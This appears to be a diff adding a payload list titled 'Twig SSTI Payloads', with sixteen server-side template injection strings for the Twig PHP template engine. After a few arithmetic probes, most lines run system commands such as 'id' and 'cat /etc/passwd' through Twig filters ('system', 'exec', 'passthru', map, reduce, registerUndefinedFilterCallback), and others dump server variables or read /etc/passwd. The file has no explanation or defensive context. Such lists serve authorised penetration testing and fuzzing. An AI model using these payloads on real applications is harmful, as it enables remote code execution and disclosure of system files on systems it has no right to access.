@@ -1,0 +1,16 @@
+# Twig SSTI Payloads
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+{{'id'|filter('system')}}
+{{'cat /etc/passwd'|filter('system')}}
+{{'cat /etc/passwd'|filter('exec')}}
+{{'cat /etc/passwd'|filter('passthru')}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{['id']|map('system')|join}}
+{{['cat\x20/etc/passwd']|map('system')|join}}
+{{[0]|reduce('system','id')}}
